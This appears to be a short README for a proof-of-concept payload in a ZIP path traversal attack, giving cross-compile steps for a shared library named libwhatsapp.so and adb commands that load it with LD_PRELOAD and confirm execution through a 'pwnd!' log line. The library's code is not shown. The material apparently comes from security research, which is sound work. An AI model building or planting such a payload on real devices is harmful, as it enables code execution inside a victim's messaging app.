# ZIP path traversal payload

To build this library:

    export CROSS_COMPILE=/opt/android-ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-
    make

Then, make sure it works as expected:

    adb push libwhatsapp.so /data/local/tmp
    adb shell
    cd /data/local/tmp
    LD_PRELOAD=./libwhatsapp.so ls
    logcat --format="color brief" *:S CENSUS:*
    ...
    01-28 16:51:44.937 25651 25651 I CENSUS  : pwnd!

